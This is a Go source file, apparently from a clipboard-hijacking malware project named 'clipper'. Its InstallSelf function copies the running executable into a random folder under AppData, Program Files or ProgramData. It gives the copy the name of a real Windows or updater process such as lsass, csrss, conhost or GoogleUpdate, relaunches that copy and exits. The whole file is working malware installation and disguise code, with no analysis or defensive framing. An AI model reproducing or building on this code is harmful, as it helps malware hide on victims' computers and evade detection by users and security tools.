package install

import (
	"io"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"clipper/src/utils"
)


func InstallSelf() {
	exePath, err := utils.GetSelfPath()
	if err != nil {
		return
	}
	
	var possiblePaths []string
	
	// %appdata%
	appdata := os.Getenv("APPDATA")
	if appdata != "" {
		entries, _ := os.ReadDir(appdata)
		for _, entry := range entries {
			if entry.IsDir() {
				possiblePaths = append(possiblePaths, filepath.Join(appdata, entry.Name()))
			}
		}
	}
	
	// %programfiles%
	programFiles := os.Getenv("ProgramFiles")
	if programFiles != "" {
		possiblePaths = append(possiblePaths, programFiles)
		
		entries, _ := os.ReadDir(programFiles)
		for _, entry := range entries {
			if entry.IsDir() {
				possiblePaths = append(possiblePaths, filepath.Join(programFiles, entry.Name()))
			}
		}
	}
	
	programFilesX86 := os.Getenv("ProgramFiles(x86)")
	if programFilesX86 != "" && programFilesX86 != programFiles {
		possiblePaths = append(possiblePaths, programFilesX86)
		
		entries, _ := os.ReadDir(programFilesX86)
		for _, entry := range entries {
			if entry.IsDir() {
				possiblePaths = append(possiblePaths, filepath.Join(programFilesX86, entry.Name()))
			}
		}
	}

	// %programdata%
	programData := os.Getenv("ProgramData")
	if programData != "" {
		possiblePaths = append(possiblePaths, programData)
		
		entries, _ := os.ReadDir(programData)
		for _, entry := range entries {
			if entry.IsDir() {
				possiblePaths = append(possiblePaths, filepath.Join(programData, entry.Name()))
			}
		}
	}
	
	exeDir := filepath.Dir(exePath)
	for _, path := range possiblePaths {
		if strings.HasPrefix(filepath.Clean(exeDir), filepath.Clean(path)) {
			return
		}
	}
	

	if len(possiblePaths) == 0 {
		return
	}
	
	names := []string{
		"lsass", "csrss", "services",
		"searchindexer", "searchprotocolhost", "conhost", "dllhost",
		"wininit", "trustedinstaller", "msiexec", "wermgr", "werfault",
		"audiosrv", "spooler", "bits", "wuauclt", "securityhealthservice",
		"securityhealthsystray", "googleupdate", "microsoftedgeupdate",
		"edgeupdate", "onedrive", "onedriveupdate", "adobeupdate", "acrotray",
		"javaupdate", "systemservice", "systemhost", "servicehost", "hostservice",
		"runtimehost", "updatehost", "windowshost", "systemruntime",
		"MicrosoftEdgeUpdateTaskMachineCore", "MicrosoftEdgeUpdateTaskMachineUA",
		"GoogleUpdateTaskMachineCore", "GoogleUpdateTaskMachineUA",
	}

	randomName := names[rand.Intn(len(names))]

	installDir := possiblePaths[rand.Intn(len(possiblePaths))]
	installedExe := filepath.Join(installDir, randomName+".exe")
	
	os.MkdirAll(installDir, 0755)

	in, _ := os.Open(exePath)
	out, _ := os.Create(installedExe)
	io.Copy(out, in)
	in.Close()
	out.Close()

	cmd := exec.Command(installedExe, os.Args[1:]...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	cmd.Start()
	
	os.Exit(0)
}